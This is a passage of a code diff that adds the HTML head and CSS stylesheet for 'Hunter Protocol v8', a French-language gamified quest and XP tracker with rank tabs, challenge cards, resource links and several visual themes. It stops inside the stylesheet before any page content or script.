@@ -1,0 +1,2891 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="theme-color" content="#000000">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="apple-mobile-web-app-title" content="Hunter Protocol">
+<meta name="mobile-web-app-capable" content="yes">
+<title>Hunter Protocol v8</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Rajdhani:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E⚔️%3C/text%3E%3C/svg%3E">
+<link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23000'/%3E%3Ctext y='80' x='15' font-size='70'%3E⚔️%3C/text%3E%3C/svg%3E">
+<style>
+  /* ==================== THEMES ==================== */
+  :root, [data-theme="solo"] {
+    --bg: #000;
+    --text: #f1f5f9;
+    --text-dim: #94a3b8;
+    --text-mute: #64748b;
+    --card-bg-1: rgba(15,23,42,0.85);
+    --card-bg-2: rgba(0,0,0,0.85);
+    --quest-bg: rgba(15,23,42,0.6);
+    --border: #334155;
+    --border-dim: #1e293b;
+    --grid-color: rgba(139,92,246,0.4);
+    --primary: #c084fc;
+    --primary-2: #9333ea;
+    --accent: #22d3ee;
+    --xp-color: #facc15;
+    --success: #10b981;
+    --danger: #ef4444;
+    --quote-color: #c084fc;
+    --notification-bg: linear-gradient(90deg, #2e1065, #000);
+  }
+
+  [data-theme="cyber"] {
+    --bg: #0a0014;
+    --text: #f0f0ff;
+    --text-dim: #b8a8d0;
+    --text-mute: #6b5b8a;
+    --card-bg-1: rgba(20,5,40,0.85);
+    --card-bg-2: rgba(5,0,15,0.85);
+    --quest-bg: rgba(20,5,40,0.6);
+    --border: #4a2068;
+    --border-dim: #2a1040;
+    --grid-color: rgba(255,0,200,0.3);
+    --primary: #ff00cc;
+    --primary-2: #cc00aa;
+    --accent: #00ffff;
+    --xp-color: #ffff00;
+    --success: #00ff88;
+    --danger: #ff0066;
+    --quote-color: #ff00cc;
+    --notification-bg: linear-gradient(90deg, #4a0040, #000);
+  }
+
+  [data-theme="matrix"] {
+    --bg: #000000;
+    --text: #00ff41;
+    --text-dim: #00aa30;
+    --text-mute: #006622;
+    --card-bg-1: rgba(0,20,5,0.85);
+    --card-bg-2: rgba(0,5,0,0.9);
+    --quest-bg: rgba(0,20,5,0.6);
+    --border: #003322;
+    --border-dim: #001a11;
+    --grid-color: rgba(0,255,65,0.3);
+    --primary: #00ff41;
+    --primary-2: #00cc33;
+    --accent: #00ff41;
+    --xp-color: #88ff00;
+    --success: #00ff41;
+    --danger: #ff3300;
+    --quote-color: #00ff41;
+    --notification-bg: linear-gradient(90deg, #003311, #000);
+  }
+
+  [data-theme="anonymous"] {
+    --bg: #0a0a0a;
+    --text: #e0e0e0;
+    --text-dim: #999999;
+    --text-mute: #555555;
+    --card-bg-1: rgba(20,20,20,0.85);
+    --card-bg-2: rgba(5,5,5,0.85);
+    --quest-bg: rgba(15,15,15,0.6);
+    --border: #333333;
+    --border-dim: #1a1a1a;
+    --grid-color: rgba(200,200,200,0.15);
+    --primary: #cccccc;
+    --primary-2: #888888;
+    --accent: #ffffff;
+    --xp-color: #dddddd;
+    --success: #88aa88;
+    --danger: #aa4444;
+    --quote-color: #cccccc;
+    --notification-bg: linear-gradient(90deg, #1a1a1a, #000);
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  html, body { background: var(--bg); color: var(--text); font-family: 'Rajdhani', system-ui, sans-serif; overflow-x: hidden; min-height: 100vh; transition: background 0.5s, color 0.5s; }
+  body { padding-top: env(safe-area-inset-top); padding-bottom: env(safe-area-inset-bottom); }
+
+  [data-theme="matrix"] body, [data-theme="matrix"] html { font-family: 'Share Tech Mono', monospace; }
+
+  .bg-fx { position: fixed; inset: 0; pointer-events: none; z-index: 0; transition: background 0.6s; }
+  .bg-grid { position: fixed; inset: 0; pointer-events: none; z-index: 0;
+    background-image: linear-gradient(var(--grid-color) 1px, transparent 1px), linear-gradient(90deg, var(--grid-color) 1px, transparent 1px);
+    background-size: 50px 50px; opacity: 0.04; }
+
+  /* Matrix rain effect (only for matrix theme) */
+  .matrix-rain { display: none; position: fixed; inset: 0; pointer-events: none; z-index: 0; opacity: 0.15; }
+  [data-theme="matrix"] .matrix-rain { display: block; }
+
+  .container { position: relative; z-index: 1; max-width: 1100px; margin: 0 auto; padding: 16px; }
+  @media (min-width: 768px) { .container { padding: 32px; } }
+
+  .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; gap: 8px; }
+  .top-bar-right { display: flex; align-items: center; gap: 12px; }
+  .system-tag { font-family: 'Orbitron', sans-serif; font-size: 10px; letter-spacing: 0.4em; color: var(--text-mute); }
+  .icon-btn { background: none; border: none; color: var(--text-mute); cursor: pointer; padding: 6px; display: flex; align-items: center; transition: color 0.2s; }
+  .icon-btn:hover { color: var(--accent); }
+  .icon-btn svg { width: 18px; height: 18px; }
+  .reset-btn { background: none; border: none; color: var(--text-mute); font-family: 'Orbitron', sans-serif; font-size: 10px; letter-spacing: 0.2em; cursor: pointer; padding: 6px; }
+  .reset-btn:hover { color: var(--danger); }
+
+  h1.title { font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: clamp(28px, 7vw, 56px); letter-spacing: 0.05em; line-height: 1; margin-bottom: 4px; transition: color 0.5s, text-shadow 0.5s; }
+  .subtitle { font-family: 'Orbitron', sans-serif; font-size: 11px; letter-spacing: 0.3em; color: var(--text-mute); margin-bottom: 24px; }
+
+  .status-grid { display: grid; gap: 12px; grid-template-columns: 1fr; margin-bottom: 24px; }
+  @media (min-width: 768px) { .status-grid { grid-template-columns: 2fr 1fr; gap: 16px; } }
+
+  .status-card { background: linear-gradient(135deg, var(--card-bg-1), var(--card-bg-2)); border: 2px solid; padding: 20px; backdrop-filter: blur(8px); transition: border-color 0.5s, box-shadow 0.5s; }
+  @media (min-width: 768px) { .status-card { padding: 24px; } }
+
+  .rank-row { display: flex; align-items: center; gap: 16px; margin-bottom: 16px; }
+  .rank-letter { font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: clamp(56px, 14vw, 84px); line-height: 1; transition: color 0.5s, text-shadow 0.5s; }
+  .rank-info-label { font-family: 'Orbitron', sans-serif; font-size: 9px; letter-spacing: 0.3em; color: var(--text-mute); }
+  .rank-info-name { font-family: 'Orbitron', sans-serif; font-weight: 700; font-size: clamp(14px, 3.5vw, 20px); letter-spacing: 0.05em; transition: color 0.5s; }
+  .rank-info-sub { font-size: 13px; color: var(--text-dim); }
+
+  .xp-row { display: flex; justify-content: space-between; font-family: 'JetBrains Mono', monospace; font-size: 11px; margin-bottom: 6px; }
+  .xp-row .left { color: var(--text-dim); }
+  .xp-bar-wrap { height: 12px; background: var(--bg); border: 1px solid var(--border); position: relative; overflow: hidden; }
+  .xp-bar { height: 100%; transition: width 0.7s cubic-bezier(0.4, 0, 0.2, 1); position: relative; }
+  .xp-bar::after { content: ''; position: absolute; inset: 0; opacity: 0.5; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.6), transparent); animation: shimmer 2s linear infinite; }
+  @keyframes shimmer { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
+  .total-xp { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-mute); margin-top: 6px; }
+
+  .stats-card { padding: 18px; background: linear-gradient(135deg, var(--card-bg-1), var(--card-bg-2)); border: 1px solid var(--border); }
+  .stats-label { font-family: 'Orbitron', sans-serif; font-size: 10px; letter-spacing: 0.3em; color: var(--text-mute); margin-bottom: 12px; }
+  .stat-row { display: flex; align-items: center; gap: 8px; font-size: 13px; margin-bottom: 8px; }
+  .stat-icon { width: 16px; height: 16px; flex-shrink: 0; }
+  .stat-key { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-dim); width: 32px; }
+  .stat-bar-wrap { flex: 1; height: 4px; background: var(--border-dim); }
+  .stat-bar { height: 100%; transition: width 0.5s; }
+  .stat-val { font-family: 'JetBrains Mono', monospace; font-size: 11px; font-weight: bold; min-width: 28px; text-align: right; }
+
+  .section-label { font-family: 'Orbitron', sans-serif; font-size: 10px; letter-spacing: 0.3em; color: var(--text-mute); margin-bottom: 12px; }
+  .rank-tabs { display: flex; gap: 8px; overflow-x: auto; padding-bottom: 8px; margin-bottom: 24px; -webkit-overflow-scrolling: touch; scrollbar-width: thin; }
+  .rank-tabs::-webkit-scrollbar { height: 4px; }
+  .rank-tabs::-webkit-scrollbar-thumb { background: var(--border); }
+
+  .rank-tab { flex-shrink: 0; padding: 10px 14px; border: 2px solid var(--border); background: transparent; cursor: pointer; transition: all 0.3s; display: flex; align-items: center; gap: 8px; min-width: max-content; color: inherit; }
+  .rank-tab:disabled { opacity: 0.3; cursor: not-allowed; }
+  .rank-tab.active { box-shadow: 0 0 20px var(--rank-glow, transparent); }
+  .rank-tab .tab-letter { font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 22px; color: var(--text-mute); transition: color 0.3s; }
+  .rank-tab.active .tab-letter { color: var(--rank-glow); }
+  .rank-tab .tab-name { font-family: 'Orbitron', sans-serif; font-weight: 700; font-size: 10px; letter-spacing: 0.1em; color: var(--text-dim); transition: color 0.3s; }
+  .rank-tab.active .tab-name { color: var(--rank-glow); }
+  .rank-tab .tab-duration { font-size: 9px; color: var(--text-mute); }
+  .lock-icon { width: 12px; height: 12px; }
+
+  .quests { display: flex; flex-direction: column; gap: 14px; }
+  .quest { border: 2px solid; transition: all 0.4s; overflow: hidden; }
+  .quest.complete { border-color: var(--success) !important; background: linear-gradient(135deg, rgba(16,185,129,0.1), transparent) !important; box-shadow: 0 0 20px rgba(16,185,129,0.3); }
+
+  .quest-header { width: 100%; padding: 16px; display: flex; align-items: center; gap: 14px; text-align: left; background: var(--quest-bg); border: none; cursor: pointer; color: inherit; transition: background 0.2s; }
+  .quest-header:hover { background: rgba(255,255,255,0.04); }
+
+  .quest-icon-box { flex-shrink: 0; width: 44px; height: 44px; display: flex; align-items: center; justify-content: center; border: 2px solid; }
+  .quest-icon-box svg { width: 22px; height: 22px; }
+
+  .quest-info { flex: 1; min-width: 0; }
+  .quest-tags { display: flex; align-items: center; gap: 8px; margin-bottom: 4px; flex-wrap: wrap; }
+  .quest-type-badge { font-family: 'Orbitron', sans-serif; font-size: 9px; letter-spacing: 0.2em; padding: 2px 8px; border: 1px solid; }
+  .quest-xp { font-family: 'JetBrains Mono', monospace; font-size: 11px; font-weight: bold; color: var(--xp-color); }
+  .quest-title { font-family: 'Orbitron', sans-serif; font-weight: 700; font-size: 14px; letter-spacing: 0.03em; color: var(--text); }
+  @media (min-width: 768px) { .quest-title { font-size: 16px; } }
+  .quest.complete .quest-title { color: var(--success); }
+  .quest-progress-row { display: flex; align-items: center; gap: 10px; margin-top: 8px; }
+  .quest-progress-bar { flex: 1; height: 5px; background: var(--border-dim); max-width: 200px; }
+  .quest-progress-fill { height: 100%; transition: width 0.5s, background 0.3s; }
+  .quest-progress-text { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-dim); }
+
+  .quest-chevron { width: 18px; height: 18px; color: var(--text-dim); transition: transform 0.3s; flex-shrink: 0; }
+  .quest.expanded .quest-chevron { transform: rotate(90deg); }
+
+  .quest-body { display: none; padding: 18px 20px; border-top: 1px solid; }
+  .quest.expanded .quest-body { display: block; animation: expand 0.3s ease-out; }
+  @keyframes expand { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+
+  .objectives-section { margin-bottom: 18px; }
+  .obj-section-label { font-family: 'Orbitron', sans-serif; font-size: 10px; letter-spacing: 0.25em; color: var(--text-dim); margin-bottom: 10px; text-transform: uppercase; }
+  .objective { display: flex; align-items: flex-start; gap: 12px; padding: 6px 0; }
+  .obj-check { flex-shrink: 0; margin-top: 2px; width: 20px; height: 20px; border: 2px solid var(--text-mute); background: transparent; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: all 0.2s; padding: 0; }
+  .obj-check:hover { transform: scale(1.1); }
+  .obj-check.checked { border-color: var(--success); background: var(--success); }
+  .obj-check svg { width: 12px; height: 12px; color: #000; opacity: 0; transition: opacity 0.2s; }
+  .obj-check.checked svg { opacity: 1; }
+  .obj-text { font-size: 14px; color: var(--text); transition: color 0.2s, text-decoration 0.2s; }
+  .obj-text.done { text-decoration: line-through; color: var(--text-mute); }
+
+  .resources { margin-top: 16px; padding-top: 16px; border-top: 1px dashed rgba(148,163,184,0.2); }
+
+  /* CHALLENGES (practical exercises) */
+  .challenges { margin-top: 18px; padding-top: 16px; border-top: 1px dashed rgba(148,163,184,0.2); }
+  .challenges-title {
+    font-family: 'Orbitron', sans-serif; font-size: 11px; letter-spacing: 0.25em;
+    color: #fbbf24; margin-bottom: 12px; display: flex; align-items: center; gap: 6px;
+  }
+  .challenges-title svg { width: 14px; height: 14px; }
+  .challenge {
+    background: rgba(251,191,36,0.04);
+    border: 1px solid rgba(251,191,36,0.2);
+    border-left: 3px solid #fbbf24;
+    padding: 12px 14px;
+    margin-bottom: 10px;
+    transition: all 0.2s;
+  }
+  .challenge.long { border-left-color: #ef4444; background: rgba(239,68,68,0.04); border-color: rgba(239,68,68,0.2); }
+  .challenge.long .challenge-time { color: #f87171; }
+  .challenge-header { display: flex; align-items: center; gap: 8px; margin-bottom: 6px; flex-wrap: wrap; }
+  .challenge-num { font-family: 'Orbitron', sans-serif; font-weight: 700; font-size: 11px; color: #fbbf24; padding: 2px 6px; border: 1px solid #fbbf24; }
+  .challenge.long .challenge-num { color: #ef4444; border-color: #ef4444; }
+  .challenge-time { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: #fcd34d; }
+  .challenge-title { font-weight: 700; color: var(--text); font-size: 13px; flex: 1; min-width: 200px; }
+  .challenge-desc { color: var(--text-dim); font-size: 13px; line-height: 1.5; margin-bottom: 8px; }
+  .challenge-validate {
+    background: rgba(16,185,129,0.08); border-left: 2px solid #10b981;
+    padding: 6px 10px; margin-top: 8px; font-size: 12px; color: #6ee7b7;
+  }
+  .challenge-validate strong { color: #34d399; font-family: 'Orbitron', sans-serif; font-size: 10px; letter-spacing: 0.1em; }
+  .challenge-toggles { display: flex; gap: 6px; margin-top: 8px; flex-wrap: wrap; }
+  .challenge-toggle-btn {
+    background: transparent;
+    border: 1px solid var(--border);
+    padding: 4px 10px;
+    font-size: 11px;
+    color: var(--text-dim);
+    cursor: pointer;
+    font-family: 'Orbitron', sans-serif;
+    letter-spacing: 0.05em;
+    transition: all 0.2s;
+  }
+  .challenge-toggle-btn.hint { border-color: #60a5fa; color: #93c5fd; }
+  .challenge-toggle-btn.hint:hover { background: rgba(59,130,246,0.1); }
+  .challenge-toggle-btn.solution { border-color: #ef4444; color: #fca5a5; }
+  .challenge-toggle-btn.solution:hover { background: rgba(239,68,68,0.1); }
+  .challenge-reveal {
+    margin-top: 8px;
+    padding: 10px 12px;
+    font-size: 12px;
+    line-height: 1.5;
+    display: none;
+    animation: revealAnim 0.3s ease-out;
+  }
+  @keyframes revealAnim { from { opacity: 0; transform: translateY(-4px); } to { opacity: 1; transform: translateY(0); } }
+  .challenge-reveal.show { display: block; }
+  .challenge-reveal.hint-content { background: rgba(59,130,246,0.08); border-left: 2px solid #60a5fa; color: #bfdbfe; }
+  .challenge-reveal.solution-content { background: rgba(239,68,68,0.08); border-left: 2px solid #ef4444; color: #fecaca; }
+  .challenge-reveal code {
+    background: rgba(0,0,0,0.4); padding: 1px 5px;
+    font-family: 'JetBrains Mono', monospace; font-size: 11px;
+    color: #fbbf24;
+  }
+  .challenge-reveal pre {
+    background: rgba(0,0,0,0.5); padding: 8px 10px; margin: 6px 0;
+    font-family: 'JetBrains Mono', monospace; font-size: 11px;
+    color: #fcd34d; overflow-x: auto; border-left: 2px solid #fbbf24;
+  }
+  .challenge-check {
+    margin-top: 10px;
+    display: flex; align-items: center; gap: 8px;
+    cursor: pointer; user-select: none;
+  }
+  .challenge-checkbox {
+    width: 18px; height: 18px; border: 2px solid var(--text-mute);
+    background: transparent; cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+    transition: all 0.2s;
+  }
+  .challenge-checkbox.done { border-color: #10b981; background: #10b981; }
+  .challenge-checkbox svg { width: 11px; height: 11px; color: #000; opacity: 0; }
+  .challenge-checkbox.done svg { opacity: 1; }
+  .challenge-check-label { font-size: 12px; color: var(--text-dim); font-family: 'Orbitron', sans-serif; letter-spacing: 0.05em; }
+  .challenge.completed { border-left-color: #10b981; background: rgba(16,185,129,0.05); }
+  .challenge.completed .challenge-num { color: #10b981; border-color: #10b981; }
+  .res-group { margin-bottom: 12px; }
+  .res-group-title { font-family: 'Orbitron', sans-serif; font-size: 10px; letter-spacing: 0.25em; margin-bottom: 8px; display: flex; align-items: center; gap: 6px; }
+  .res-group-title svg { width: 14px; height: 14px; }
+  .res-list { display: flex; flex-wrap: wrap; gap: 6px; }
+  .res-link { display: inline-flex; align-items: center; gap: 5px; padding: 5px 10px; background: var(--quest-bg); border: 1px solid; font-size: 12px; text-decoration: none; transition: all 0.2s; }
+  .res-link:hover { transform: translateY(-1px); }
+  .res-link svg { width: 11px; height: 11px; }
+  .res-lang { font-size: 9px; padding: 1px 4px; background: rgba(255,255,255,0.1); border-radius: 2px; margin-left: 2px; font-family: 'JetBrains Mono', monospace; font-weight: bold; }
+
+  .res-video .res-group-title { color: #f87171; }
+  .res-video .res-link { border-color: #7f1d1d; color: #fca5a5; }
+  .res-video .res-link:hover { border-color: #ef4444; background: rgba(127,29,29,0.3); color: #fecaca; }
+
+  .res-article .res-group-title { color: #60a5fa; }
+  .res-article .res-link { border-color: #1e3a8a; color: #93c5fd; }
+  .res-article .res-link:hover { border-color: #3b82f6; background: rgba(30,58,138,0.3); color: #bfdbfe; }
+
+  .res-tool .res-group-title { color: #34d399; }
+  .res-tool .res-link { border-color: #064e3b; color: #6ee7b7; }
+  .res-tool .res-link:hover { border-color: #10b981; background: rgba(6,78,59,0.3); color: #a7f3d0; }
+
+  .res-cheat .res-group-title { color: #fbbf24; }
+  .res-cheat .res-link { border-color: #78350f; color: #fcd34d; }
+  .res-cheat .res-link:hover { border-color: #f59e0b; background: rgba(120,53,15,0.3); color: #fde68a; }
+
+  .res-platform .res-group-title { color: #c084fc; }
+  .res-platform .res-link { border-color: #581c87; color: #d8b4fe; }
+  .res-platform .res-link:hover { border-color: #a855f7; background: rgba(88,28,135,0.3); color: #e9d5ff; }
+
+  /* MODALS */
+  .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.92); z-index: 50; display: flex; align-items: center; justify-content: center; padding: 16px; backdrop-filter: blur(4px); }
+  .modal { max-width: 600px; width: 100%; background: linear-gradient(135deg, rgba(127,29,29,0.4), #000); border: 2px solid var(--danger); padding: 28px; box-shadow: 0 0 60px rgba(220,38,38,0.4); }
+  .modal-title { display: flex; align-items: center; gap: 12px; margin-bottom: 20px; }
+  .modal-title h2 { font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: clamp(16px, 4vw, 22px); letter-spacing: 0.1em; color: #f87171; }
+  .modal-title svg { width: 28px; height: 28px; color: var(--danger); animation: pulse 2s infinite; }
+  @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
+  .modal-content { color: var(--text); font-size: 14px; line-height: 1.6; margin-bottom: 24px; }
+  .modal-content p { margin-bottom: 12px; }
+  .modal-content ul { list-style: none; padding-left: 8px; }
+  .modal-content li { display: flex; gap: 10px; margin-bottom: 8px; }
+  .modal-content li::before { content: '▸'; color: #f87171; flex-shrink: 0; }
+  .modal-content strong { color: #fca5a5; }
+  .modal-btn { width: 100%; padding: 14px; background: var(--danger); color: white; font-family: 'Orbitron', sans-serif; font-weight: 700; letter-spacing: 0.15em; font-size: 13px; border: none; cursor: pointer; transition: filter 0.2s; }
+  .modal-btn:hover { filter: brightness(1.2); }
+
+  .reset-modal { background: var(--card-bg-1); border: 2px solid var(--danger); padding: 24px; max-width: 400px; }
+  .reset-modal h3 { font-family: 'Orbitron', sans-serif; font-size: 18px; color: #f87171; margin-bottom: 12px; }
+  .reset-modal p { color: var(--text-dim); margin-bottom: 16px; }
+  .reset-actions { display: flex; gap: 12px; }
+  .reset-actions button { flex: 1; padding: 10px; cursor: pointer; font-family: 'Rajdhani', sans-serif; font-weight: 600; font-size: 14px; }
+  .btn-cancel { background: transparent; border: 1px solid var(--border); color: var(--text); }
+  .btn-cancel:hover { background: rgba(255,255,255,0.05); }
+  .btn-confirm { background: var(--danger); border: none; color: white; font-weight: 700; }
+  .btn-confirm:hover { filter: brightness(1.2); }
+
+  /* SETTINGS MODAL */
+  .settings-modal { background: var(--card-bg-1); border: 2px solid var(--primary); padding: 24px; max-width: 480px; width: 100%; }
+  .settings-modal h3 { font-family: 'Orbitron', sans-serif; font-size: 18px; color: var(--primary); margin-bottom: 20px; letter-spacing: 0.1em; }
+  .settings-section { margin-bottom: 20px; }
+  .settings-label { font-family: 'Orbitron', sans-serif; font-size: 11px; letter-spacing: 0.2em; color: var(--text-dim); margin-bottom: 10px; }
+  .theme-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; }
+  .theme-btn { padding: 14px 10px; border: 2px solid var(--border); background: transparent; cursor: pointer; font-family: 'Orbitron', sans-serif; font-weight: 700; font-size: 11px; letter-spacing: 0.1em; color: var(--text); transition: all 0.2s; text-align: center; }
+  .theme-btn.active { border-color: var(--primary); box-shadow: 0 0 15px var(--primary); color: var(--primary); }
+  .theme-btn:hover:not(.active) { border-color: var(--text-dim); }
+
+  .toggle-row { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; }
+  .toggle-row label { font-size: 14px; color: var(--text); }
+  .toggle { position: relative; width: 44px; height: 24px; background: var(--border); border: none; cursor: pointer; transition: background 0.3s; }
+  .toggle.on { background: var(--success); }
+  .toggle::after { content: ''; position: absolute; top: 2px; left: 2px; width: 18px; height: 18px; background: white; transition: transform 0.3s; }
+  .toggle.on::after { transform: translateX(20px); }
+
+  .settings-close { width: 100%; padding: 12px; background: var(--primary); color: black; font-family: 'Orbitron', sans-serif; font-weight: 700; letter-spacing: 0.15em; font-size: 13px; border: none; cursor: pointer; margin-top: 12px; }
+
+  /* LEVEL UP CINEMATIC */
+  .level-up-overlay { position: fixed; inset: 0; z-index: 60; display: none; align-items: center; justify-content: center; pointer-events: none; overflow: hidden; }
+  .level-up-overlay.show { display: flex; }
+  .level-up-bg { position: absolute; inset: 0; background: rgba(0,0,0,0.85); animation: fadeIn 0.4s; }
+  /* Pulsing aura */
+  .level-up-aura {
+    position: absolute; left: 50%; top: 50%;
+    width: 80vw; height: 80vw; max-width: 800px; max-height: 800px;
+    transform: translate(-50%, -50%);
+    background: radial-gradient(circle, var(--lu-glow, #c084fc) 0%, transparent 60%);
+    opacity: 0;
+    animation: auraPulse 4.5s ease-out;
+  }
+  @keyframes auraPulse {
+    0% { opacity: 0; transform: translate(-50%, -50%) scale(0.3); }
+    20% { opacity: 0.8; transform: translate(-50%, -50%) scale(1); }
+    50% { opacity: 0.6; transform: translate(-50%, -50%) scale(1.2); }
+    100% { opacity: 0; transform: translate(-50%, -50%) scale(1.5); }
+  }
+  /* Lightning rays */
+  .level-up-rays {
+    position: absolute; left: 50%; top: 50%;
+    width: 200vw; height: 200vh;
+    transform: translate(-50%, -50%);
+    background: conic-gradient(
+      from 0deg,
+      transparent 0deg, var(--lu-glow, #c084fc) 1deg, transparent 2deg,
+      transparent 60deg, var(--lu-glow, #c084fc) 61deg, transparent 62deg,
+      transparent 120deg, var(--lu-glow, #c084fc) 121deg, transparent 122deg,
+      transparent 180deg, var(--lu-glow, #c084fc) 181deg, transparent 182deg,
+      transparent 240deg, var(--lu-glow, #c084fc) 241deg, transparent 242deg,
+      transparent 300deg, var(--lu-glow, #c084fc) 301deg, transparent 302deg
+    );
+    opacity: 0;
+    animation: raysSpin 4.5s linear;
+    filter: blur(2px);
+  }
+  @keyframes raysSpin {
+    0% { opacity: 0; transform: translate(-50%, -50%) rotate(0deg); }
+    20% { opacity: 0.4; }
+    50% { opacity: 0.6; }
+    100% { opacity: 0; transform: translate(-50%, -50%) rotate(720deg); }
+  }
+  /* Glitch shake */
+  .level-up-shake { animation: shake 0.3s 6; }
+  @keyframes shake {
+    0%, 100% { transform: translate(0,0); }
+    25% { transform: translate(-3px, 2px); }
+    50% { transform: translate(2px, -3px); }
+    75% { transform: translate(-2px, -2px); }
+  }
+  .level-up-content { position: relative; text-align: center; animation: levelUpAnim 4.5s ease-out; z-index: 1; }
+  .level-up-tag { font-family: 'Orbitron', sans-serif; font-size: 13px; letter-spacing: 0.5em; margin-bottom: 12px; opacity: 0; animation: fadeInDelay 0.5s 0.5s forwards; }
+  .level-up-letter {
+    font-family: 'Orbitron', sans-serif; font-weight: 900;
+    font-size: clamp(96px, 22vw, 200px); line-height: 1; margin-bottom: 16px;
+    position: relative;
+    animation: letterEntry 1s cubic-bezier(0.34, 1.56, 0.64, 1);
+  }
+  @keyframes letterEntry {
+    0% { transform: scale(0); opacity: 0; filter: blur(20px); }
+    50% { transform: scale(1.3); opacity: 1; filter: blur(0px); }
+    100% { transform: scale(1); opacity: 1; }
+  }
+  .level-up-letter::before, .level-up-letter::after {
+    content: attr(data-letter); position: absolute; top: 0; left: 0; width: 100%;
+    color: var(--lu-glow, #c084fc); opacity: 0.7; mix-blend-mode: screen;
+  }
+  .level-up-letter::before { animation: glitch1 0.4s 3 0.8s; }
+  .level-up-letter::after { animation: glitch2 0.4s 3 0.8s; }
+  @keyframes glitch1 { 0%, 100% { transform: translate(0,0); } 50% { transform: translate(-4px, 2px); } }
+  @keyframes glitch2 { 0%, 100% { transform: translate(0,0); } 50% { transform: translate(4px, -2px); } }
+  .level-up-name { font-family: 'Orbitron', sans-serif; font-weight: 700; font-size: clamp(20px, 5vw, 32px); letter-spacing: 0.08em; opacity: 0; animation: fadeInDelay 0.6s 1.2s forwards; }
+  .level-up-sub { font-size: 16px; color: var(--text-dim); margin-top: 8px; opacity: 0; animation: fadeInDelay 0.6s 1.5s forwards; }
+  .level-up-arise { margin-top: 24px; font-family: 'Orbitron', sans-serif; font-style: italic; font-size: 14px; letter-spacing: 0.2em; opacity: 0; animation: ariseAnim 1.5s 2s forwards; }
+  @keyframes fadeInDelay { to { opacity: 1; } }
+  @keyframes ariseAnim {
+    0% { opacity: 0; transform: scale(0.8); }
+    50% { opacity: 1; transform: scale(1.1); }
+    100% { opacity: 0.8; transform: scale(1); }
+  }
+  @keyframes levelUpAnim {
+    0% { opacity: 0; }
+    10% { opacity: 1; }
+    85% { opacity: 1; }
+    100% { opacity: 0; }
+  }
+  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+  .notification { position: fixed; top: 20px; right: 20px; z-index: 30; min-width: 280px; max-width: calc(100vw - 40px); background: var(--notification-bg); border: 2px solid; padding: 14px; transform: translateX(400px); opacity: 0; transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1); }
+  .notification.show { transform: translateX(0); opacity: 1; }
+  .notif-tag { font-family: 'Orbitron', sans-serif; font-size: 10px; letter-spacing: 0.3em; margin-bottom: 4px; }
+  .notif-title { font-size: 13px; font-weight: 700; color: var(--text); margin-bottom: 8px; }
+  .notif-stats { display: flex; gap: 12px; font-size: 11px; flex-wrap: wrap; }
+  .notif-xp { color: var(--xp-color); font-weight: 700; }
+  .notif-stat { color: var(--accent); }
+
+  footer { margin-top: 48px; padding-top: 24px; border-top: 1px solid var(--border-dim); text-align: center; }
+
+  /* QUOTE BANNER (top of page) */
+  .quote-banner {
+    background: linear-gradient(135deg, var(--card-bg-1), var(--card-bg-2));
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--primary);
+    padding: 14px 18px;
+    margin-bottom: 20px;
+    position: relative;
+    cursor: pointer;
+    transition: all 0.3s;
+    animation: quoteFadeIn 0.6s ease-out;
+  }
+  @keyframes quoteFadeIn { from { opacity: 0; transform: translateY(-8px); } to { opacity: 1; transform: translateY(0); } }
+  .quote-banner:hover { border-left-color: var(--accent); transform: translateX(2px); }
+  .quote-banner-tag { font-family: 'Orbitron', sans-serif; font-size: 9px; letter-spacing: 0.3em; color: var(--text-mute); margin-bottom: 6px; }
+  .quote-banner-text { font-style: italic; color: var(--text); font-size: 14px; line-height: 1.5; margin-bottom: 4px; }
+  @media (min-width: 768px) { .quote-banner-text { font-size: 15px; } }
+  .quote-banner-author { font-size: 11px; color: var(--text-dim); font-family: 'JetBrains Mono', monospace; }
+  .quote-banner-author .source { color: var(--text-mute); }
+  .quote-banner-new {
+    position: absolute; top: 8px; right: 10px;
+    font-size: 9px; padding: 2px 6px; background: var(--success); color: black;
+    font-family: 'Orbitron', sans-serif; font-weight: 700; letter-spacing: 0.1em;
+    animation: pulse 2s infinite;
+  }
+  .quote-refresh {
+    position: absolute; bottom: 10px; right: 12px;
+    background: none; border: none; color: var(--text-mute); cursor: pointer;
+    padding: 4px; opacity: 0.5; transition: opacity 0.2s;
+  }
+  .quote-refresh:hover { opacity: 1; }
+  .quote-refresh svg { width: 14px; height: 14px; }
+
